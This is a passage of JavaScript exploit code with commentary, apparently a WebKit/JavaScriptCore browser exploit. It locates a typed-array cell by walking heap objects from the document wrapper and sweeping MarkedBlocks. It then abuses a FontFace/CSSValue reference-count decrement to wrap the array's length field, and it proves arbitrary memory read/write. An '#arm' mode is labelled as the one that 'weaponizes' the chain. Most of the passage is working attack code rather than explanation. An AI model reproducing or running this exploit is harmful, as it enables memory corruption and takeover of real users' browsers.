            p1329/p1345 (expando bridge), p1346 (W-butterfly walk - MISS),
            p1348 (JSDocument walk - reaches DOC but NO-VC: storage scan

            WebKit_1400 source that landed in-repo

   m_vector==backing equality is STILL the sole commit gate, so correctness
   never depends on a guess - the source just removes the search):
     JSCell (8B):  m_structureID u32@+0x00 ; m_type(JSType) u8@+0x05
     JSObject:     m_butterfly@+0x08 ; inline property storage at cell+0x10

                   new Uint8Array(ArrayBuffer(192)) => WastefulTypedArray

                   (low 3 bits 0) so length() uses raw m_length => wrap works.

                   ScriptWrappable, so we reach JSDocument, where we plant.

                   L2 +0x08 -> FF (C++ FontFace)
                   FF +0x08 -> DOC (ActiveDOMObject::m_scriptExecutionContext)
                   DOC+0x08 -> WeakImpl (ScriptWrappable::m_wrapper)   [woff set]
                   WeakImpl +0x00 -> JSDocument  (mask low 4 bits)

     PATH B (primary)  directed source-exact walk to JSDocument, then read its
                       property storage (inline + butterfly negative) for the
                       planted holders:

                           contiguous run of view-cell pointers in HA.butterfly)
                         document.__vK  = sp[k] (named expandos: direct pointers)
                       commit offset-free on m_vector in BK.

                       MarkedBlock (0x4000, 0x4000-aligned, homogeneous, stride
                       = cell size ~0x30) is swept to recover the 7 siblings -
                       all reads inside VC's own already-mapped block (no hole
                       crash). This is the correct role for the block-scan that
                       p1347 ran blind (and that the angle-1/3 verdicts marked
                       dead for lack of a typed-array anchor): PATH B is the
                       anchor.

                       MarkedBlocks of the JSDocument candidate cells in <=3
                       reads each (atoms at stride 0x30, m_vector in BK), sweep
                       only a block that classifies typed. Expected low-yield
                       (IsoHeap segregation), kept for completeness, read-capped.

     *(V+off) == a known backing in BK, for off tried in {0x10,0x08,0x18}
     (+0x10 is the source offset and is tried first; the 2 extras guard a build
     surprise). One 64-bit equality, false-positive-free (~2^-64): it proves V
     is a LIVE view we own, fixes m_vector empirically, and names which sp[k].

     default        SAFE: find + validate VC + resolve m_length, beacon, STOP.

                    R/W by an OOB write from the giant view into a 2nd known

   var DW=[0x08,0x10,0x18,0x20];   /* ScriptWrappable::m_wrapper (self-validated) */

     var rw=rdHx(DOC+BigInt(DW[wi3]),0x10,4); if(rw==='')continue; var wp=qAt(rw,0);
     if(!heap(wp))continue;
     var rj=rdHx(wp,0x10,4); if(rj==='')continue; var jd=qAt(rj,0)& ~0xFn;   /* WeakImpl::m_jsValue */
     if(!heap(jd))continue;
     /* collect JSDocument property-storage candidate pointers */
     var cand=[], cs={};
     function addc(p){ if(!heap(p))return; var kk=p.toString(16); if(cs[kk])return; cs[kk]=1; cand.push(p); }
     var inl=rdHx(jd,0x90,3); if(inl!=='') for(var so=0x10; so*2+16<=inl.length; so+=8) addc(qAt(inl,so));
     var jch=rdHx(jd,0x10,3); var jbut=(jch!=='')?qAt(jch,8):0n;
     if(heap(jbut)){ var seg2=rdHx(jbut-0x200n,0x200,3); if(seg2!=='') for(var bo=0; bo*2+16<=seg2.length; bo+=8) addc(qAt(seg2,bo)); }
     if(cand.length){ JSDOC=jd; woff=DW[wi3]; B('WALK-JSDOC-0x'+jd.toString(16)+'-woff0x'+DW[wi3].toString(16),''); B('CANDS','n'+cand.length); }
     /* commit: direct view cell first, then array-holder */
     for(var ci=0; ci<cand.length && VC===0n && ci<90; ci++){
       var v=asView(cand[ci]);
       if(v){ VC=v.cell; matched=v.w; mvOff=v.off; B('VC-MVEC-MATCH-off0x'+v.off.toString(16)+'-k'+v.w.idx+'-bk0x'+v.w.a.toString(16),'direct-expando'); break; }
       var va=asArrayHolder(cand[ci]);
       if(va){ VC=va.cell; matched=va.w; mvOff=va.off; B('VC-MVEC-MATCH-off0x'+va.off.toString(16)+'-k'+va.w.idx+'-bk0x'+va.w.a.toString(16),'arr-holder-0x'+cand[ci].toString(16)); break; }
     }
     if(JSDOC!==0n) break;   /* this wrapper offset reached storage; stop sweeping woff */
   }
 }

 /* ---- PATH C' (generic, bounded) only if PATH B yielded no VC: classify the
         MarkedBlocks of the candidate cells themselves (they are mapped), sweep
         a block that classifies typed. <=3 reads to classify; read-capped. ---- */
 if(VC===0n && heap(JSDOC)){
   var seeds=[JSDOC], ss={}; ss[JSDOC.toString(16)]=1;
   /* reuse the last candidate set is out of scope here; re-derive a couple of
      mapped MarkedSpace seeds from JSDOC's own inline slots */
   var si=rdHx(JSDOC,0x90,2); if(si!=='') for(var q0=0x10; q0*2+16<=si.length; q0+=8){ var sp0=qAt(si,q0); if(heap(sp0)&&!ss[sp0.toString(16)]){ ss[sp0.toString(16)]=1; seeds.push(sp0);} }
   for(var sidx=0; sidx<seeds.length && VC===0n && READS<READCAP-120; sidx++){
     var blk=seeds[sidx] & ~0x3FFFn;
     /* classify in <=3 reads: atoms at stride 0x30, look for m_vector in BK */
     var typed=false;
     for(var a3=0;a3<3;a3++){ var cc=rdHx(blk+BigInt(a3*0x30),0x20,1); if(cc===''){ continue; } if(whichB(qAt(cc,0x10))){ typed=true; break; } }
     if(!typed) continue;
     B('BLK-CLASSIFY-0x'+blk.toString(16),'typed-candidate');
     for(var off=0; off<0x4000 && VC===0n && READS<READCAP-60; off+=0x30){
       var v=asView(blk+BigInt(off)); if(v){ VC=v.cell; matched=v.w; mvOff=v.off; B('VC-MVEC-MATCH-off0x'+v.off.toString(16)+'-k'+v.w.idx+'-bk0x'+v.w.a.toString(16),'blockscan-0x'+blk.toString(16)); } }
   }
 }

 if(VC===0n){ restoreAll(SAFE_SNAP); B('NO-VC','no sp[] view cell reached (JSDOC=0x'+(JSDOC?JSDOC.toString(16):'0')+' BK='+BK.length+') - fresh-open'); S('no view cell - fresh-open','#4a2a12'); try{document.fonts.add(W);}catch(e){} return; }
 B('VC-FOUND-0x'+VC.toString(16),'m_vector@+0x'+mvOff.toString(16)+' sp['+matched.idx+']');
 S('VIEW CELL located + m_vector confirmed','#0a7a2a');

 /* ---- PATH C (seeded): sweep VC's own (mapped) MarkedBlock for the siblings.
         Homogeneous IsoSubspace, stride = cell size ~0x30. All reads inside the
         already-mapped block -> no unmapped-hole crash. ---- */
 var fam=[{cell:VC,w:matched}]; var seen={}; seen[VC.toString(16)]=1;
 var vblk = VC & ~0x3FFFn, sib=0;
 for(var off2=0; off2<0x4000 && READS<READCAP-80; off2+=0x30){
   var A=vblk+BigInt(off2); var kk2=A.toString(16); if(seen[kk2])continue;
   var ph2=rdHx(A,0x20,1); if(ph2==='')continue; var w2=whichB(qAt(ph2,0x10));
   if(w2){ seen[kk2]=1; fam.push({cell:A,w:w2}); sib++; B('VC-SIB-0x'+A.toString(16)+'-k'+w2.idx,''); }
 }
 B('BLK-TYPED-0x'+vblk.toString(16)+'-n'+fam.length,'siblings='+sib);

 /* ---- resolve m_length offset + width against the victim's real JS byteLength
         (self-validation, read-only). Source: m_length is size_t@+0x18, so the
         WIDTH-4 (low dword) wrap is the expected hit; WIDTH-8 kept as a guard. ---- */
 var vh=rdHx(VC,0x30,3);
 var expLen=BigInt(matched.o.byteLength);                   /* 0xC0 for Uint8Array(ArrayBuffer(192)) */
 var lenOff=-1, width=0, decTgt=0n, decCalls=0, mlenRaw=0n;
 var tryOff=[mvOff+8, 0x18, 0x1C, 0x20];
 for(var ti=0; ti<tryOff.length; ti++){ var LO=tryOff[ti]; if(LO+8>0x30)continue;
   var q=qAt(vh,LO), lo=q&0xFFFFFFFFn, hi=q>>32n;
   if(lo===expLen && hi===0n){ lenOff=LO;width=4;decTgt=VC+BigInt(LO);decCalls=0x61;mlenRaw=q;break; }   /* size_t low dword (expected) */
   if(lo===expLen){ lenOff=LO;width=4;decTgt=VC+BigInt(LO);decCalls=0x61;mlenRaw=q;break; }
   if(hi===expLen && lo===0n){ lenOff=LO;width=8;decTgt=VC+BigInt(LO+4);decCalls=0x61;mlenRaw=q;break; } /* unusual high placement */
 }
 if(lenOff<0){ restoreAll(SAFE_SNAP); B('MLEN-UNRESOLVED','no dword==0x'+expLen.toString(16)+' in VC[0x10..0x28] q18=0x'+qAt(vh,0x18).toString(16)); S('mlen offset unknown - report VC dump','#4a2a12'); try{document.fonts.add(W);}catch(e){} return; }
 B('MLEN-0x'+mlenRaw.toString(16)+'-WIDTH-'+width,'off0x'+lenOff.toString(16)+' decTgt0x'+decTgt.toString(16)+' x'+decCalls);

 if(!ARMED){ restoreAll(SAFE_SNAP); B('SAFE-DONE','view cell controlled + '+fam.length+' siblings + length field resolved. Re-run with #arm to wrap.'); S('SAFE-DONE - add #arm to weaponize','#0a7a2a'); try{document.fonts.add(W);}catch(e){} return; }

 /* ================= ARMED: wrap m_length, prove arbitrary R/W ================= */
 /* switch buf from forge-read shape to the P1310 decrement shape: m_family
    (buf+0x18) = tgtAddr; each W.family= runs CSSValue::deref() twice (-2). */
 function fireDec(tgtAddr,times){
   restoreAll(SAFE_SNAP);
   for(var i3=0x58;i3<0x68;i3++)buf[i3]=0; wq(buf,0x08,L1); buf[0x10]=0; wq(buf,0x18,tgtAddr); buf[0x82]=3;
   try{ document.fonts.add(W); }catch(e){}
   var f=0; for(var t=0;t<times;t++){ try{ W.family='z'+(t&0x7FFF); f++; }catch(e){ break; } }
   return f;
 }
 function bl(){ try{ return matched.o.byteLength; }catch(e){ return 0; } }

 var f1=fireDec(decTgt,decCalls);
 B('LEN-DEC-FIRE-0x'+decTgt.toString(16)+'-x'+f1,'width'+width);
 var nb=bl();
 /* width self-correction guard (source says size_t, so low-dword wrap should hit;
    this only fires on a surprise): try the high dword of the size_t. */
 if(nb<=0x1000000){
   var dt2=VC+BigInt(lenOff+4);
   var f2=fireDec(dt2,1);
   B('LEN-DEC-FIRE-0x'+dt2.toString(16)+'-x'+f2,'fallback-high-dword');
   nb=bl();
 }
 var nbh=(nb>>>0).toString(16); if(nb>0xFFFFFFFF) nbh=nb.toString(16);
 if(nb>0x1000000){ B('LEN-WRAPPED-0x'+nbh,'victim sp['+matched.idx+'] byteLength now huge'); S('LEN-WRAPPED - giant view live','#0a7a2a'); }
 else { restoreAll(SAFE_SNAP); B('LEN-WRAP-MISS-0x'+nbh,'byteLength not huge; try FastTypedArray victim (new Uint8Array(192), m_mode 0x10, no 2nd bound)'); try{document.fonts.add(W);}catch(e){} return; }

 /* cross-view R/W proof (NO forge-read): pick a 2nd known backing ABOVE the
    victim, write OOB from the giant view, read it back natively. */
 var tgt=null; for(var gi=0;gi<BK.length;gi++){ if(BK[gi].a>matched.a){ if(!tgt||BK[gi].a<tgt.a) tgt=BK[gi]; } }
 if(!tgt){ B('ARW-NO-TGT','no backing above victim; widen BK'); return; }
 var idxB=tgt.a-matched.a, idx=Number(idxB);
 try{ tgt.o[0]=0x11; }catch(e){}
 var ok=false; try{ matched.o[idx]=0xAB; matched.o[idx+1]=0xCD; ok=true; }catch(e){ B('ARW-WRITE-ERR',(''+(e&&e.message||e)).slice(0,40)); }
 if(ok){ var rb0=0,rb1=0; try{ rb0=tgt.o[0]; rb1=tgt.o[1]; }catch(e){}
   if(rb0===0xAB&&rb1===0xCD){ B('ARW-PROOF-0x'+rb0.toString(16)+rb1.toString(16)+'-at0x'+tgt.a.toString(16),'OOB write from sp['+matched.idx+'] landed in sp['+tgt.idx+'] idx0x'+idx.toString(16)); S('ARW-PROOF - base-free arbitrary R/W (Step 10)','#7a0a5a'); }
   else{ B('ARW-MISS-0x'+rb0.toString(16)+rb1.toString(16),'expected abcd (idx0x'+idx.toString(16)+') - 2nd bound? use FastTypedArray victim'); } }
 B('DONE','armed path complete');
}
